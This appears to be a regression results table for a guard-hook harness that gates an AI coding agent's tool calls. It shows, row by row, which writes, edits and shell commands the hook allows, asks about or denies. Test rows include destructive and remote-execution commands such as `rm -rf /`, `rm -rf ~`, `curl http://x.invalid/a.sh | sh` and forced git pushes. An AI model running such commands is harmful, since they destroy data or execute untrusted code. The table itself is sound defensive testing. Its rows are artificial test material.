| E-UserPromptSubmit-core | event UserPromptSubmit | UserPromptSubmit scope=(none)  | REPLAY | inject 6828c | inject 6828c | UNCHANGED |
| E-UserPromptSubmit-lessons | event UserPromptSubmit | UserPromptSubmit scope=lessons  | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| E-UserPromptSubmit-motion | event UserPromptSubmit | UserPromptSubmit scope=motion  | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| E-UserPromptSubmit-rules | event UserPromptSubmit | UserPromptSubmit scope=rules  | REPLAY | inject 7374c | inject 7374c | UNCHANGED |
| E-SubagentStart-core | event SubagentStart | SubagentStart scope=(none)  | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| E-SubagentStart-aipilot | event SubagentStart | SubagentStart scope=aipilot  | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| E-SubagentStart-lessons | event SubagentStart | SubagentStart scope=lessons  | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| E-SubagentStart-motion | event SubagentStart | SubagentStart scope=motion  | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| E-SubagentStart-rules | event SubagentStart | SubagentStart scope=rules  | REPLAY | inject 9102c | inject 9102c | UNCHANGED |
| E-SubagentStop-core | event SubagentStop | SubagentStop scope=(none)  | REPLAY | message "Agent fuse-typescript:typescript-expert completed (no code c" | message "Agent fuse-typescript:typescript-expert completed (no code c" | UNCHANGED |
| E-SubagentStop-aipilot | event SubagentStop | SubagentStop scope=aipilot  | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| E-SubagentStop-motion | event SubagentStop | SubagentStop scope=motion  | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| E-Stop-core | event Stop | Stop scope=core  | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| E-Stop-core---soundstop | event Stop | Stop scope=core --sound,stop | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| E-Stop-lessons | event Stop | Stop scope=lessons  | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| E-Stop-motion | event Stop | Stop scope=motion  | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| E-Stop-core-active | event Stop | Stop scope=core  | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| E-SessionEnd-core | event SessionEnd | SessionEnd scope=(none)  | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| E-SessionEnd-aipilot | event SessionEnd | SessionEnd scope=aipilot  | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| E-TeammateIdle-core | event TeammateIdle | TeammateIdle scope=(none)  | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| E-TaskCompleted-core | event TaskCompleted | TaskCompleted scope=(none)  | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| E-PreCompact-core | event PreCompact | PreCompact scope=(none)  | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| E-InstructionsLoaded-core | event InstructionsLoaded | InstructionsLoaded scope=(none)  | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| E-Notification-core---soundpermission | event Notification | Notification scope=core --sound,permission | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| E-Notification-core---soundhuman | event Notification | Notification scope=core --sound,human | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| E-PermissionRequest-core---soundpermission | event PermissionRequest | PermissionRequest scope=core --sound,permission | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| Z01 | malformed | PreToolUse: not JSON | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| Z02 | malformed | empty stdin | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| Z03 | malformed | whitespace stdin | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| Z04 | malformed | JSON null | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| Z05 | malformed | JSON array | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| Z06 | malformed | empty object {} | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| Z07 | malformed | PreToolUse Bash without tool_input | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| Z08 | malformed | PreToolUse Bash command is a number | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| Z09 | malformed | PreToolUse Write without file_path | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| Z10 | malformed | unknown event name | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| Z11 | malformed | session_id invalid chars + dangerous Bash | REPLAY | deny: Dangerous command | deny: Dangerous command | UNCHANGED |
| Z12 | malformed | missing session_id + dangerous Bash | REPLAY | deny: Dangerous command | deny: Dangerous command | UNCHANGED |
| Z13 | malformed | cwd missing + dangerous Bash | REPLAY | deny: Dangerous command | deny: Dangerous command | UNCHANGED |
| Z14 | malformed | truncated JSON mid-string | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| Z15 | malformed | empty stdin, scope motion | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| Z16 | malformed | not JSON, scope rules | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| Z17 | malformed | dangerous Bash with huge padding (>1MB) | REPLAY | deny: Dangerous command | deny: Dangerous command | UNCHANGED |
| B01 | APEX auth NEG | full auth then Write 3-line src/b.ts (`<scratch>/proj/src/b.ts`, 3 lines) [20 steps] | REPLAY | allow + msg "✓ evidence fresh — explore+research" | allow + msg "✓ evidence fresh — explore+research" | UNCHANGED |
| B02 | file-size NEG | full auth then Write 90 lines (`<scratch>/proj/src/ok.ts`, 90 lines) [20 steps] | REPLAY | allow + msg "✓ evidence fresh — explore+research" | allow + msg "✓ evidence fresh — explore+research" | UNCHANGED |
| B03 | file-size NEG | full auth then Write 100 lines (boundary) (`<scratch>/proj/src/edge.ts`, 100 lines) [20 steps] | REPLAY | allow + msg "✓ evidence fresh — explore+research" | allow + msg "✓ evidence fresh — explore+research" | UNCHANGED |
| B04 | file-size | full auth then Write 101 lines (`<scratch>/proj/src/edge.ts`, 101 lines) [20 steps] | REPLAY | allow + msg "✓ evidence fresh — explore+research" | allow + msg "✓ evidence fresh — explore+research" | UNCHANGED |
| B05 | file-size | full auth then Write 150 lines (`<scratch>/proj/src/big.ts`, 150 lines) [20 steps] | REPLAY | allow + msg "✓ evidence fresh — explore+research" | allow + msg "✓ evidence fresh — explore+research" | UNCHANGED |
| B06 | file-size NEG | full auth, FUSE_SOLID_MAX_LINES=50, 40 lines (`<scratch>/proj/src/f.ts`, 40 lines) (env {"FUSE_SOLID_MAX_LINES":"50"}) [20 steps] | REPLAY | allow + msg "✓ evidence fresh — explore+research" | allow + msg "✓ evidence fresh — explore+research" | UNCHANGED |
| B07 | file-size | full auth, FUSE_SOLID_MAX_LINES=50, 60 lines (`<scratch>/proj/src/f.ts`, 60 lines) (env {"FUSE_SOLID_MAX_LINES":"50"}) [20 steps] | REPLAY | deny: SOLID file-size limit | deny: SOLID file-size limit | UNCHANGED |
| B08 | APEX auth NEG | full auth then non-trivial Edit (6 lines, 9-line result) (`<scratch>/proj/src/a.ts`) [20 steps] | REPLAY | allow + msg "✓ evidence fresh — explore+research" | allow + msg "✓ evidence fresh — explore+research" | UNCHANGED |
| B09 | file-size | full auth, MAX_LINES=3, Edit growing 4-line file (`<scratch>/proj/src/a.ts`) (env {"FUSE_SOLID_MAX_LINES":"3"}) [20 steps] | REPLAY | deny: SOLID file-size limit | deny: SOLID file-size limit | UNCHANGED |
| B10 | file-size NEG | full auth, MAX_LINES=3, Edit shrinking is allowed? (same-size replace) (`<scratch>/proj/src/a.ts`) (env {"FUSE_SOLID_MAX_LINES":"3"}) [20 steps] | REPLAY | deny: SOLID file-size limit | deny: SOLID file-size limit | UNCHANGED |
| B11 | APEX auth NEG | full auth(react) Write App.tsx (`<scratch>/proj-react/src/App.tsx`, 1 lines) [23 steps] | REPLAY | allow + msg "✓ evidence fresh — explore+research" | allow + msg "✓ evidence fresh — explore+research" | UNCHANGED |
| B12 | store budget | full auth: zustand store 60 lines in stores/ (limit 40) (`<scratch>/proj-react/modules/x/src/stores/useFooStore.ts`, 62 lines) [38 steps] | REPLAY | allow + msg "✓ evidence fresh — explore+research" | allow + msg "✓ evidence fresh — explore+research" | UNCHANGED |
| B13 | store budget NEG | full auth: zustand store 10 lines in stores/ (`<scratch>/proj-react/modules/x/src/stores/useFooStore.ts`, 12 lines) [38 steps] | REPLAY | allow + msg "✓ evidence fresh — explore+research" | allow + msg "✓ evidence fresh — explore+research" | UNCHANGED |
| B14 | store budget NEG | full auth, MAX_LINES=200: 60-line store (budget 80) (`<scratch>/proj-react/modules/x/src/stores/useFooStore.ts`, 62 lines) (env {"FUSE_SOLID_MAX_LINES":"200"}) [38 steps] | REPLAY | allow + msg "✓ evidence fresh — explore+research" | allow + msg "✓ evidence fresh — explore+research" | UNCHANGED |
| B15 | store budget | full auth, MAX_LINES=50 (budget 20): 30-line store (`<scratch>/proj-react/modules/x/src/stores/useFooStore.ts`, 32 lines) (env {"FUSE_SOLID_MAX_LINES":"50"}) [38 steps] | REPLAY | deny: SOLID violation | deny: SOLID violation | UNCHANGED |
| B16 | file-size | full auth(react) 150-line .tsx (`<scratch>/proj-react/src/Big.tsx`, 150 lines) [23 steps] | REPLAY | allow + msg "✓ evidence fresh — explore+research" | allow + msg "✓ evidence fresh — explore+research" | UNCHANGED |
| B17 | freshness | full auth, sleep > TTL (FUSE_ENFORCE_TTL_SEC=2), Write (`<scratch>/proj/src/b.ts`, 3 lines) (env {"FUSE_ENFORCE_TTL_SEC":"2"}) [20 steps] | REPLAY | deny: APEX: explore + research required | deny: APEX: explore + research required | UNCHANGED |
| B18 | freshness NEG | full auth, Write within TTL=600 (`<scratch>/proj/src/b.ts`, 3 lines) (env {"FUSE_ENFORCE_TTL_SEC":"600"}) [20 steps] | REPLAY | allow + msg "✓ evidence fresh — explore+research" | allow + msg "✓ evidence fresh — explore+research" | UNCHANGED |
| B19 | APEX auth | agents+docs only, SOLID refs unread (generic) (`<scratch>/proj/src/b.ts`, 3 lines) [5 steps] | REPLAY | deny: APEX: read SOLID references for generic | deny: APEX: read SOLID references for generic | UNCHANGED |
| B20 | APEX auth | SOLID refs read only, no agents/docs (`<scratch>/proj/src/b.ts`, 3 lines) [16 steps] | REPLAY | deny: APEX: explore + research required | deny: APEX: explore + research required | UNCHANGED |
| B21 | APEX auth NEG | Explore sub-agent Write 150 lines (size-exempt) after full auth (`<scratch>/proj/src/big.ts`, 150 lines) [20 steps] | REPLAY | allow + msg "✓ evidence fresh — explore+research" | allow + msg "✓ evidence fresh — explore+research" | UNCHANGED |
| B22 | APEX auth | full auth then 7 trivial Edits (budget) (`<scratch>/proj/src/a.ts`) [26 steps] | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| B23 | APEX auth | 7 trivial Edits, no auth (fast-path budget) (`<scratch>/proj/src/a.ts`) [7 steps] | REPLAY | deny: APEX: explore + research required | deny: APEX: explore + research required | UNCHANGED |
| B24 | APEX auth | trivial Edit 4-line new_string vs 5-line (boundary), no auth (`<scratch>/proj/src/a.ts`) [2 steps] | REPLAY | deny: APEX: explore + research required | deny: APEX: explore + research required | UNCHANGED |
| O11 | one-shot | Write denied, full auth, same Write allowed -> corrected; summary line [22 steps] | REPLAY | inject 10116c | inject 10116c | UNCHANGED |
| O12 | one-shot | Write denied, full auth, Write to a DIFFERENT file allowed -> no credit for first [22 steps] | REPLAY | inject 10116c | inject 10116c | UNCHANGED |
| O13 | one-shot | size deny then smaller Write same path allowed -> corrected [22 steps] | REPLAY | inject 10116c | inject 10116c | UNCHANGED |
| O14 | one-shot NEG | ordinary allowed Write after full auth, no prior deny: no phantom credit [21 steps] | REPLAY | inject 10116c | inject 10116c | UNCHANGED |
| O15 | one-shot | same deny twice (denied again, not a fix) [3 steps] | REPLAY | inject 10116c | inject 10116c | UNCHANGED |
| O16 | one-shot | Bash deny then Bash allow of same op key impossible; Write after Bash deny of other key (no credit) [22 steps] | REPLAY | inject 10116c | inject 10116c | UNCHANGED |
| L01 | SubagentStop | SubagentStop after a code Write PostToolUse (sniper/challenger reminder) [2 steps] | REPLAY | inject 284c | inject 284c | UNCHANGED |
| L02 | SubagentStop | SubagentStop aipilot scope after code Write [2 steps] | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| L03 | Stop | Stop (core) after a code Write (stop gate / reminder) [2 steps] | REPLAY | stop: VERIFICATION RECEIPT REQUIRED: code files changed but no fre | stop: VERIFICATION RECEIPT REQUIRED: code files changed but no fre | UNCHANGED |
| L04 | Stop | Stop (core) after Write then stop_hook_active=true [2 steps] | REPLAY | stop: VERIFICATION RECEIPT REQUIRED: code files changed but no fre | stop: VERIFICATION RECEIPT REQUIRED: code files changed but no fre | UNCHANGED |
| L05 | Stop | Stop (core --sound stop) after a code Write [2 steps] | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| L06 | Stop | Stop (lessons) after a code Write [2 steps] | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| L07 | UserPromptSubmit | prompt after code Write (reminders in injection) [2 steps] | REPLAY | inject 10116c | inject 10116c | UNCHANGED |
| L08 | UserPromptSubmit | second prompt same session (dedup of injection) [2 steps] | REPLAY | inject 10116c | inject 10116c | UNCHANGED |
| L09 | SessionStart | SessionStart then SubagentStart(rules) same session [2 steps] | REPLAY | inject 9102c | inject 9102c | UNCHANGED |
| L10 | SessionStart | SessionStart in React project (core) | REPLAY | inject 512c | inject 512c | UNCHANGED |
| L11 | SessionStart | SessionStart source=resume (core) | REPLAY | inject 623c | inject 623c | UNCHANGED |
| L12 | SessionStart | SessionStart source=compact (core) | REPLAY | inject 623c | inject 623c | UNCHANGED |
| B25 | store budget | full auth: store 41 code lines (boundary +1) (`<scratch>/proj-react/modules/x/src/stores/useFooStore.ts`, 41 lines) [38 steps] | REPLAY | allow + msg "✓ evidence fresh — explore+research" | allow + msg "✓ evidence fresh — explore+research" | UNCHANGED |
| B26 | store budget NEG | full auth: store 40 code lines (boundary) (`<scratch>/proj-react/modules/x/src/stores/useFooStore.ts`, 40 lines) [38 steps] | REPLAY | allow + msg "✓ evidence fresh — explore+research" | allow + msg "✓ evidence fresh — explore+research" | UNCHANGED |
| B27 | store budget | full auth: store outside stores/ (`<scratch>/proj-react/src/lib/useBazStore.ts`, 4 lines) [38 steps] | REPLAY | deny: SOLID violation | deny: SOLID violation | UNCHANGED |
| B28 | react SOLID | full auth: custom hook outside hooks/ (`<scratch>/proj-react/src/lib/useThing.ts`, 1 lines) [38 steps] | REPLAY | deny: SOLID violation | deny: SOLID violation | UNCHANGED |
| B29 | react SOLID NEG | full auth: custom hook inside hooks/ (`<scratch>/proj-react/modules/x/src/hooks/useThing.ts`, 1 lines) [38 steps] | REPLAY | allow + msg "✓ evidence fresh — explore+research" | allow + msg "✓ evidence fresh — explore+research" | UNCHANGED |
| B30 | react SOLID | full auth: interface inside components/ (`<scratch>/proj-react/modules/x/components/Card.tsx`, 2 lines) [38 steps] | REPLAY | deny: Design skill | deny: Design skill | UNCHANGED |
| W01 | web gate | PreToolUse WebFetch (core) | REPLAY | deny: CACHE HIT WebFetch (~2KB saved, cached 0h ago): | deny: CACHE HIT WebFetch (~2KB saved, cached 0h ago): | UNCHANGED |
| W02 | web gate | PreToolUse context7 query-docs (core) | REPLAY | deny: CACHE HIT (~2KB saved, cached 0h ago): --- | deny: CACHE HIT (~2KB saved, cached 0h ago): --- | UNCHANGED |
| W03 | web gate | PreToolUse exa web_search (core) | REPLAY | deny: CACHE HIT (~2KB saved, cached 0h ago): --- | deny: CACHE HIT (~2KB saved, cached 0h ago): --- | UNCHANGED |
| W04 | web gate | PreToolUse exa get_code_context (core) | REPLAY | deny: CACHE HIT (~2KB saved, cached 0h ago): --- | deny: CACHE HIT (~2KB saved, cached 0h ago): --- | UNCHANGED |
| W05 | web gate | Post context7 then repeat Pre (cache hit?) [2 steps] | REPLAY | deny: CACHE HIT (~2KB saved, cached 0h ago): --- | deny: CACHE HIT (~2KB saved, cached 0h ago): --- | UNCHANGED |
| W06 | web gate | Post exa then repeat Pre (cache hit?) [2 steps] | REPLAY | deny: CACHE HIT (~2KB saved, cached 0h ago): --- | deny: CACHE HIT (~2KB saved, cached 0h ago): --- | UNCHANGED |
| W07 | web gate | Post WebFetch then repeat Pre [2 steps] | REPLAY | deny: CACHE HIT WebFetch (~2KB saved, cached 0h ago): | deny: CACHE HIT WebFetch (~2KB saved, cached 0h ago): | UNCHANGED |
| W08 | web gate | Post exa get_code_context then Pre [2 steps] | REPLAY | deny: CACHE HIT (~2KB saved, cached 0h ago): --- | deny: CACHE HIT (~2KB saved, cached 0h ago): --- | UNCHANGED |
| D01 | deny-loop | same APEX-denied Write 6 times (`<scratch>/proj/src/b.ts`, 3 lines) [6 steps] | REPLAY | deny: APEX: explore + research required | deny: APEX: explore + research required | UNCHANGED |
| D02 | deny-loop | `rm -rf /` [6 steps] | REPLAY | deny: Dangerous command | deny: Dangerous command | UNCHANGED |
| D03 | deny-loop | `rm notes.txt` [6 steps] | REPLAY | ask: Dangerous command | ask: Dangerous command | UNCHANGED |
| O21 | one-shot summary | deny, authorize, allow, then SessionStart(core): summary line present? [40 steps] | REPLAY | inject 725c | inject 725c | UNCHANGED |
| O22 | one-shot summary | same with SessionStart scope rules [40 steps] | REPLAY | inject 9101c | inject 9101c | UNCHANGED |
| B02-100 | file-size NEG | full auth then Write 90 lines [MAX_LINES=100] (`<scratch>/proj/src/ok.ts`, 90 lines) (env {"FUSE_SOLID_MAX_LINES":"100"}) [20 steps] | REPLAY | allow + msg "✓ evidence fresh — explore+research" | allow + msg "✓ evidence fresh — explore+research" | UNCHANGED |
| B03-100 | file-size NEG | full auth then Write 100 lines (boundary) [MAX_LINES=100] (`<scratch>/proj/src/edge.ts`, 100 lines) (env {"FUSE_SOLID_MAX_LINES":"100"}) [20 steps] | REPLAY | allow + msg "✓ evidence fresh — explore+research" | allow + msg "✓ evidence fresh — explore+research" | UNCHANGED |
| B04-100 | file-size | full auth then Write 101 lines [MAX_LINES=100] (`<scratch>/proj/src/edge.ts`, 101 lines) (env {"FUSE_SOLID_MAX_LINES":"100"}) [20 steps] | REPLAY | deny: SOLID file-size limit | deny: SOLID file-size limit | UNCHANGED |
| B05-100 | file-size | full auth then Write 150 lines [MAX_LINES=100] (`<scratch>/proj/src/big.ts`, 150 lines) (env {"FUSE_SOLID_MAX_LINES":"100"}) [20 steps] | REPLAY | deny: SOLID file-size limit | deny: SOLID file-size limit | UNCHANGED |
| B16-100 | file-size | full auth(react) 150-line .tsx [MAX_LINES=100] (`<scratch>/proj-react/src/Big.tsx`, 150 lines) (env {"FUSE_SOLID_MAX_LINES":"100"}) [23 steps] | REPLAY | deny: SOLID file-size limit | deny: SOLID file-size limit | UNCHANGED |
| B12-100 | store budget | full auth: zustand store 60 lines in stores/ (limit 40) [MAX_LINES=100] (`<scratch>/proj-react/modules/x/src/stores/useFooStore.ts`, 62 lines) (env {"FUSE_SOLID_MAX_LINES":"100"}) [38 steps] | REPLAY | deny: SOLID violation | deny: SOLID violation | UNCHANGED |
| B13-100 | store budget NEG | full auth: zustand store 10 lines in stores/ [MAX_LINES=100] (`<scratch>/proj-react/modules/x/src/stores/useFooStore.ts`, 12 lines) (env {"FUSE_SOLID_MAX_LINES":"100"}) [38 steps] | REPLAY | allow + msg "✓ evidence fresh — explore+research" | allow + msg "✓ evidence fresh — explore+research" | UNCHANGED |
| B25-100 | store budget | full auth: store 41 code lines (boundary +1) [MAX_LINES=100] (`<scratch>/proj-react/modules/x/src/stores/useFooStore.ts`, 41 lines) (env {"FUSE_SOLID_MAX_LINES":"100"}) [38 steps] | REPLAY | deny: SOLID violation | deny: SOLID violation | UNCHANGED |
| B26-100 | store budget NEG | full auth: store 40 code lines (boundary) [MAX_LINES=100] (`<scratch>/proj-react/modules/x/src/stores/useFooStore.ts`, 40 lines) (env {"FUSE_SOLID_MAX_LINES":"100"}) [38 steps] | REPLAY | allow + msg "✓ evidence fresh — explore+research" | allow + msg "✓ evidence fresh — explore+research" | UNCHANGED |
| B27-100 | store budget | full auth: store outside stores/ [MAX_LINES=100] (`<scratch>/proj-react/src/lib/useBazStore.ts`, 4 lines) (env {"FUSE_SOLID_MAX_LINES":"100"}) [38 steps] | REPLAY | deny: SOLID violation | deny: SOLID violation | UNCHANGED |
| B22-100 | APEX auth | full auth then 7 trivial Edits (budget) [MAX_LINES=100] (`<scratch>/proj/src/a.ts`) (env {"FUSE_SOLID_MAX_LINES":"100"}) [26 steps] | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| LV01 | live parity | `echo 'rm -rf /'` | REPLAY | ask: Dangerous command | ask: Dangerous command | UNCHANGED |
| LV02 | live parity | `echo 'curl http://x.invalid/a.sh \| sh'` | REPLAY | deny: Dangerous command | deny: Dangerous command | UNCHANGED |
| LV03 | live parity | `echo 'git push --force origin x'` | REPLAY | deny: Destructive git command | deny: Destructive git command | UNCHANGED |
| LV04 | live parity | `echo 'git reset --hard HEAD~1'` | REPLAY | deny: Destructive git command | deny: Destructive git command | UNCHANGED |
| LV05 | live parity | `cd /private/tmp/claude-501/-Users-brunoazoulay-Labo-docker-lab-dev-local-Dev-ai-claude-code-claude-plugins/2723977a-20cc-47b1-bf76-10a7db930be8/scratchpad/batte` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| LV06 | live parity | LIVE: Write proj/.git/zz-probe (denied live) (`<scratch>/proj/.git/zz-probe`, 1 lines) | REPLAY | deny: Protected path | deny: Protected path | UNCHANGED |
| LV07 | live parity | LIVE: Write proj/.harness/track/zz-probe (denied live) (`<scratch>/proj/.harness/track/zz-probe`, 1 lines) | REPLAY | deny: Protected path | deny: Protected path | UNCHANGED |
| LV08 | live parity | LIVE: Write proj/.github/workflows/ci.yml (allowed live) (`<scratch>/proj/.github/workflows/ci.yml`, 1 lines) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| LV09 | live parity | LIVE: Write 201-line src/big.ts after full auth (denied live, max 200) (`<scratch>/proj/src/big.ts`, 201 lines) (env {"FUSE_SOLID_MAX_LINES":"200"}) [20 steps] | REPLAY | deny: SOLID file-size limit | deny: SOLID file-size limit | UNCHANGED |
| LV10 | live parity | LIVE: Write 200-line src/big.ts after full auth (boundary) (`<scratch>/proj/src/big.ts`, 200 lines) (env {"FUSE_SOLID_MAX_LINES":"200"}) [20 steps] | REPLAY | allow + msg "✓ evidence fresh — explore+research" | allow + msg "✓ evidence fresh — explore+research" | UNCHANGED |
| LS1 | live deny seen: Bash-write sed | `cd /Users/brunoazoulay/.claude/plugins/marketplaces/fusengine-plugins/plugins/node_modules/@fusengine/harness/src; grep -n "GIT_BLOCKED\\|GIT_ASK\\|PROJECT_INST` | REPLAY | deny: Bash write to code file | deny: Bash write to code file | UNCHANGED |
| LS1a | live deny seen: Bash-write sed | `cd /Users/brunoazoulay/.claude/plugins/marketplaces/fusengine-plugins/plugins/node_modules/@fusengine/harness/src; grep -n "GIT_BLOCKED\\|GIT_ASK\\|PROJECT_INST` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| LS1b | live deny seen: Bash-write sed | `cd /Users/brunoazoulay/.claude/plugins/marketplaces/fusengine-plugins/plugins/node_modules/@fusengine/harness/src; sed -n 1,60p config/limits.ts` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| LS1c | live deny seen: Bash-write sed | `cd /Users/brunoazoulay/.claude/plugins/marketplaces/fusengine-plugins/plugins/node_modules/@fusengine/harness/src; grep -rn "store" runtime/*.ts policy/*.ts -il` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| LS1d | live deny seen: Bash-write sed | `cd /Users/brunoazoulay/.claude/plugins/marketplaces/fusengine-plugins/plugins/node_modules/@fusengine/harness/src; grep -n "GIT_BLOCKED\\|GIT_ASK\\|PROJECT_INST` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| LS1e | live deny seen: Bash-write sed | `cd /Users/brunoazoulay/.claude/plugins/marketplaces/fusengine-plugins/plugins/node_modules/@fusengine/harness/src; sed -n 1,60p config/limits.ts; grep -rn "stor` | REPLAY | deny: Bash write to code file | deny: Bash write to code file | UNCHANGED |
| LS2 | live deny seen: Bash-write python | `cd /Users/brunoazoulay/.claude/plugins/marketplaces/fusengine-plugins/plugins; python3 - <<'EOF' import json,glob,re,collections seen=collections.OrderedDict() ` | REPLAY | deny: Bash write to code file | deny: Bash write to code file | UNCHANGED |
| LS3 | live deny seen: Bash-write sed | `sed -i.orig -e 's\|^import { a }\|import { b }\|' /private/tmp/claude-501/-Users-brunoazoulay-Labo-docker-lab-dev-local-Dev-ai-claude-code-claude-plugins/272397` | REPLAY | deny: Bash write to code file | deny: Bash write to code file | UNCHANGED |
| X01 | interplay: new allow path | `git status > /tmp/gb-battery.txt` | REPLAY | allow (no output) | ask: Bash file write | DIFFERENT (Bash-write gate) |
| X02 | interplay: git block | `git status > /tmp/gb-battery.txt && git push --force origin x` | REPLAY | ask: Bash file write | ask: Bash file write | UNCHANGED |
| X03 | interplay: security ask | `ls > /tmp/gb-battery.txt; rm notes.txt` | REPLAY | ask: Dangerous command | ask: Dangerous command | UNCHANGED |
| X04 | interplay: security block | `ls > /tmp/gb-battery.txt; rm -rf /` | REPLAY | deny: Dangerous command | deny: Dangerous command | UNCHANGED |
| X05 | interplay: install ask | `date > /tmp/gb-battery.txt && npm install lodash` | REPLAY | ask: Bash file write | ask: Bash file write | UNCHANGED |
| X06 | interplay: git ask | `git log --oneline > /tmp/gb-battery.txt && git commit -m x` | REPLAY | ask: Bash file write | ask: Bash file write | UNCHANGED |
| X07 | interplay: release | `ls > /tmp/gb-battery.txt && gh pr merge 1 --merge` [2 steps] | REPLAY | ask: Bash file write | ask: Bash file write | UNCHANGED |
| X08 | interplay: git ask | `git status > /tmp/gb-battery.txt && git add -A` | REPLAY | ask: Bash file write | ask: Bash file write | UNCHANGED |
| X09 | interplay: security block | `ls > /tmp/gb-battery.txt; sudo ls` | REPLAY | deny: Dangerous command | deny: Dangerous command | UNCHANGED |
| X10 | interplay: protected path | `pwd > /tmp/gb-battery.txt && echo x \| tee .claude/apex/zz-probe` | REPLAY | deny: Protected path | deny: Protected path | UNCHANGED |
| X11 | interplay: protected path | `ls > .claude/apex/zz-probe` | REPLAY | deny: Protected path | deny: Protected path | UNCHANGED |
| X12 | interplay: bash-write itself | `ls > /tmp/gb-battery.txt` | REPLAY | allow (no output) | ask: Bash file write | DIFFERENT (Bash-write gate) |
| X13 | interplay: bash-write itself | `echo hi > notes.txt` | REPLAY | deny: Bash write of literal text | ask: Bash file write | DIFFERENT (Bash-write gate) |
| X14 | interplay: bash-write itself | `printf x > src/z.ts` | REPLAY | deny: Bash write to code file | deny: Bash write to code file | UNCHANGED |
| X15 | interplay: git ask | `git commit -m x > /tmp/gb-battery.txt` | REPLAY | ask: Bash file write | ask: Bash file write | UNCHANGED |
| X16 | interplay: git ask | `git push origin main > /tmp/gb-battery.txt` | REPLAY | ask: Bash file write | ask: Bash file write | UNCHANGED |
| X17 | interplay: git block | `git push --force origin x > /tmp/gb-battery.txt` | REPLAY | ask: Bash file write | ask: Bash file write | UNCHANGED |
| X18 | interplay: git block | `git reset --hard > /tmp/gb-battery.txt` | REPLAY | ask: Bash file write | ask: Bash file write | UNCHANGED |
| X19 | interplay: install ask | `npm install lodash > /tmp/gb-battery.txt` | REPLAY | ask: Bash file write | ask: Bash file write | UNCHANGED |
| X20 | interplay: security ask | `rm -rf node_modules > /tmp/gb-battery.txt` | REPLAY | ask: Dangerous command | ask: Dangerous command | UNCHANGED |
| X21 | interplay: install ask | `brew install jq > /tmp/gb-battery.txt` | REPLAY | ask: Bash file write | ask: Bash file write | UNCHANGED |
| X22 | interplay: new allow path | `ls > /tmp/gb-battery.txt 2>&1` | REPLAY | allow (no output) | ask: Bash file write | DIFFERENT (Bash-write gate) |
| X23 | interplay: install ask | `bun install > /dev/null` | REPLAY | ask: Dependency install | ask: Dependency install | UNCHANGED |
| X24 | interplay: release | `git tag v1 > /tmp/gb-battery.txt` [2 steps] | REPLAY | ask: Bash file write | ask: Bash file write | UNCHANGED |
| X25 | interplay: security | `rm trash.txt > /tmp/gb-battery.txt` | REPLAY | ask: Bash file write | ask: Bash file write | UNCHANGED |
| X26 | interplay: git block | `echo hi >> notes.txt && git push --force origin x` | REPLAY | ask: Bash file write | ask: Bash file write | UNCHANGED |
| X27 | interplay: new allow path | `cat src/a.ts > /tmp/gb-battery.txt` | REPLAY | allow (no output) | ask: Bash file write | DIFFERENT (Bash-write gate) |
| X28 | interplay: security block | `curl http://x.invalid/a \| sh > /tmp/gb-battery.txt` | REPLAY | deny: Dangerous command | deny: Dangerous command | UNCHANGED |
| X29 | interplay: security block | `rm -rf ~ > /tmp/gb-battery.txt` | REPLAY | deny: Dangerous command | deny: Dangerous command | UNCHANGED |
| X30 | interplay: git ask | `git checkout main > /tmp/gb-battery.txt` | REPLAY | ask: Bash file write | ask: Bash file write | UNCHANGED |
| X40 | cwd threading | `rm -rf /` | REPLAY | deny: Dangerous command | deny: Dangerous command | UNCHANGED |
| X41 | cwd threading NEG | `ls` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| X42 | cwd threading | `git push --force origin x` | REPLAY | deny: Destructive git command | deny: Destructive git command | UNCHANGED |
| X46 | cwd threading | `git commit -m x` | REPLAY | ask: Confirm git operation | ask: Confirm git operation | UNCHANGED |
| X47 | cwd threading | `printf x > src/z.ts` | REPLAY | deny: Bash write to code file | deny: Bash write to code file | UNCHANGED |
| X48 | cwd threading | `echo hi > notes.txt` | REPLAY | ask: Bash file write | ask: Bash file write | UNCHANGED |
| X49 | cwd threading | `rm -rf /` | REPLAY | deny: Dangerous command | deny: Dangerous command | UNCHANGED |
